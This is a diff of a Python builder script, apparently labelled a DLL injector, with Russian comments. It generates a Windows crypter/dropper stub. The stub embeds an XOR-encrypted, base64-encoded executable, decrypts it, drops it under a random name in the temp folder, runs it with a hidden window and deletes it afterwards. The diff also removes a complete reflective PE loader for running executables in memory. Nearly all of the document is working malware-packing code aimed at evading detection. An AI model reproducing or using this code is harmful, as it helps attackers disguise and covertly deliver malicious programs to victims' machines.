@@ -1,15 +1,17 @@
+# dll_injector.py - ПРОСТОЙ И РАБОЧИЙ
 import os
 import sys
 import subprocess
 import random
 import string
+import base64
 
 def generate_random_name():
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
 
 def build_single_exe_with_dll(exe_path):
     print("=" * 60)
-    print("PROFESSIONAL BINARY REFLECTIVE LOADER")
+    print("SIMPLE LOADER BUILDER")
     print("=" * 60)
     
     if not os.path.exists(exe_path):
@@ -24,8 +26,8 @@ def build_single_exe_with_dll(exe_path):
     
     print(f"Source size: {len(exe_data) / (1024*1024):.1f} MB")
     
-    if len(exe_data) < 2 or exe_data[0] != 0x4D or exe_data[1] != 0x5A:
-        print("ERROR: Not a valid EXE file (missing MZ header)!")
+    if exe_data[0] != 0x4D or exe_data[1] != 0x5A:
+        print("ERROR: Not a valid EXE!")
         return None
     print("EXE header OK (MZ)")
     
@@ -35,18 +37,13 @@ def build_single_exe_with_dll(exe_path):
     for i, byte in enumerate(exe_data):
         encrypted.append(byte ^ key[i % len(key)])
     
-    # Сохраняем как бинарные .bin файлы
-    data_bin = os.path.join(output_dir, 'data.bin')
-    with open(data_bin, 'wb') as f:
-        f.write(encrypted)
+    # Base64 (без HEX - меньше раздувания)
+    data_b64 = base64.b64encode(encrypted).decode('ascii')
+    key_b64 = base64.b64encode(key).decode('ascii')
     
-    key_bin = os.path.join(output_dir, 'key.bin')
-    with open(key_bin, 'wb') as f:
-        f.write(key)
+    print("Creating loader...")
     
-    print("Creating loader with embedded binary...")
-    
-    loader_code = '''
+    loader_code = f'''
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -54,155 +51,105 @@ def build_single_exe_with_dll(exe_path):
 #pragma comment(linker, "/SUBSYSTEM:WINDOWS")
 #pragma comment(linker, "/ENTRY:mainCRTStartup")
 
-// Внешние бинарные данные
-extern unsigned char _binary_data_bin_start[];
-extern unsigned char _binary_data_bin_end[];
-extern unsigned char _binary_key_bin_start[];
-extern unsigned char _binary_key_bin_end[];
+static const char enc_data[] = "{data_b64}";
+static const char xor_key[] = "{key_b64}";
 
-// Reflective PE loader
-void run_pe(unsigned char* pe_data, size_t pe_size) {
-    if (pe_data[0] != 'M' || pe_data[1] != 'Z') return;
-    
-    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe_data;
-    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pe_data + dos->e_lfanew);
-    
-    if (nt->Signature != IMAGE_NT_SIGNATURE) return;
-    
-    size_t image_size = nt->OptionalHeader.SizeOfImage;
-    unsigned char* base = (unsigned char*)VirtualAlloc(
-        NULL, image_size, MEM_COMMIT | MEM_RESERVE, 
-        PAGE_EXECUTE_READWRITE
-    );
-    if (!base) return;
-    
-    memcpy(base, pe_data, nt->OptionalHeader.SizeOfHeaders);
-    
-    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
-    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
-        if (section[i].SizeOfRawData) {
-            memcpy(base + section[i].VirtualAddress, 
-                   pe_data + section[i].PointerToRawData, 
-                   section[i].SizeOfRawData);
-        }
-    }
-    
-    DWORD64 delta = (DWORD64)base - nt->OptionalHeader.ImageBase;
-    if (delta) {
-        PIMAGE_BASE_RELOCATION rel = (PIMAGE_BASE_RELOCATION)(
-            base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
-        );
-        while (rel->VirtualAddress) {
-            DWORD count = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
-            WORD* entries = (WORD*)(rel + 1);
-            for (DWORD i = 0; i < count; i++) {
-                if (entries[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
-                    DWORD* addr = (DWORD*)(base + rel->VirtualAddress + (entries[i] & 0xFFF));
-                    *addr += (DWORD)delta;
-                }
-            }
-            rel = (PIMAGE_BASE_RELOCATION)((char*)rel + rel->SizeOfBlock);
-        }
-    }
-    
-    PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(
-        base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
-    );
-    while (imp->Name) {
-        HMODULE h = LoadLibraryA((char*)base + imp->Name);
-        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(base + imp->OriginalFirstThunk);
-        PIMAGE_THUNK_DATA func = (PIMAGE_THUNK_DATA)(base + imp->FirstThunk);
-        while (thunk->u1.Function) {
-            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
-                func->u1.Function = (ULONG_PTR)GetProcAddress(h, (char*)(thunk->u1.Ordinal & 0xFFFF));
-            } else {
-                PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME)(base + thunk->u1.AddressOfData);
-                func->u1.Function = (ULONG_PTR)GetProcAddress(h, name->Name);
-            }
-            thunk++;
-            func++;
-        }
-        imp++;
-    }
-    
-    if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress) {
-        PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)(
-            base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress
-        );
-        if (tls->AddressOfCallBacks) {
-            PIMAGE_TLS_CALLBACK* callback = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
-            while (*callback) {
-                (*callback)(base, DLL_PROCESS_ATTACH, NULL);
-                callback++;
-            }
-        }
-    }
-    
-    DWORD entry = nt->OptionalHeader.AddressOfEntryPoint;
-    if (entry) {
-        ((void(*)()) (base + entry))();
-    }
-}
+void base64_decode(const char* input, unsigned char* output, int* out_len) {{
+    DWORD size = 0;
+    CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &size, NULL, NULL);
+    *out_len = size;
+    CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, output, &size, NULL, NULL);
+}}
 
-void run_payload() {
-    size_t data_size = _binary_data_bin_end - _binary_data_bin_start;
-    size_t key_size = _binary_key_bin_end - _binary_key_bin_start;
+void xor_decrypt(unsigned char* data, int len, const char* key, int key_len) {{
+    for(int i = 0; i < len; i++) {{
+        data[i] ^= key[i % key_len];
+    }}
+}}
+
+void run_payload() {{
+    // Декодируем base64
+    int data_len = 0;
+    unsigned char* decoded = (unsigned char*)malloc(strlen(enc_data));
+    if (!decoded) return;
+    base64_decode(enc_data, decoded, &data_len);
     
-    unsigned char* data = _binary_data_bin_start;
-    unsigned char* key = _binary_key_bin_start;
+    // Расшифровываем XOR
+    unsigned char* decrypted = (unsigned char*)malloc(data_len);
+    if (!decrypted) {{ free(decoded); return; }}
+    memcpy(decrypted, decoded, data_len);
+    xor_decrypt(decrypted, data_len, xor_key, strlen(xor_key));
     
-    unsigned char* decrypted = (unsigned char*)malloc(data_size);
-    if (!decrypted) return;
-    memcpy(decrypted, data, data_size);
-    
-    for (size_t i = 0; i < data_size; i++) {
-        decrypted[i] ^= key[i % key_size];
-    }
-    
-    if (decrypted[0] != 'M' || decrypted[1] != 'Z') {
+    // Проверка EXE
+    if (decrypted[0] != 0x4D || decrypted[1] != 0x5A) {{
         MessageBoxA(NULL, "Not a valid EXE!", "Error", MB_OK);
+        free(decoded);
         free(decrypted);
         return;
-    }
+    }}
     
-    run_pe(decrypted, data_size);
+    // Сохраняем во временный файл
+    char tmp[MAX_PATH];
+    char fn[13];
+    GetTempPathA(MAX_PATH, tmp);
+    const char* c = "abcdefghijklmnopqrstuvwxyz0123456789";
+    for(int i = 0; i < 12; i++) {{
+        fn[i] = c[rand() % 36];
+    }}
+    fn[12] = '\\0';
+    strcat(tmp, fn);
+    strcat(tmp, ".exe");
+    
+    HANDLE f = CreateFileA(tmp, GENERIC_WRITE, 0, NULL,
+                          CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (f != INVALID_HANDLE_VALUE) {{
+        DWORD w;
+        WriteFile(f, decrypted, data_len, &w, NULL);
+        CloseHandle(f);
+        
+        // ЗАПУСКАЕМ С UAC (НЕ СКРЫВАЕМ)
+        STARTUPINFOA si = {{sizeof(si)}};
+        PROCESS_INFORMATION pi;
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        
+        CreateProcessA(tmp, NULL, NULL, NULL, FALSE,
+                       NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
+        
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        Sleep(9000);
+        DeleteFileA(tmp);
+    }}
+    
+    free(decoded);
     free(decrypted);
-}
+}}
 
-int main() {
+int main() {{
     run_payload();
     Sleep(15000);
     return 0;
-}
+}}
 '''
     
     loader_src = os.path.join(output_dir, 'loader.c')
     with open(loader_src, 'w', encoding='utf-8') as f:
         f.write(loader_code)
     
-    print("Creating binary objects...")
-    
-    data_obj = os.path.join(output_dir, 'data.o')
-    key_obj = os.path.join(output_dir, 'key.o')
-    
-    # Используем правильную архитектуру
-    subprocess.run(['objcopy', '-I', 'binary', '-O', 'elf64-x86-64', '-B', 'i386:x86-64', data_bin, data_obj], capture_output=True)
-    subprocess.run(['objcopy', '-I', 'binary', '-O', 'elf64-x86-64', '-B', 'i386:x86-64', key_bin, key_obj], capture_output=True)
-    
-    print("Compiling reflective loader...")
+    print("Compiling loader...")
     loader_exe = os.path.join(output_dir, f'loader_{generate_random_name()}.exe')
     
     cmd = [
         'gcc',
         loader_src,
-        data_obj,
-        key_obj,
         '-o', loader_exe,
         '-O3',
         '-s',
         '-static',
         '-Wl,--subsystem,windows',
-        '-mwindows'
+        '-mwindows',
+        '-lcrypt32'
     ]
     
     try:
@@ -227,13 +174,8 @@ int main() {
     print(f"Size: {final_size:.2f} MB")
     print("=" * 60)
     
-    # Cleanup
     try:
         os.remove(loader_src)
-        os.remove(data_bin)
-        os.remove(key_bin)
-        os.remove(data_obj)
-        os.remove(key_obj)
     except:
         pass
     
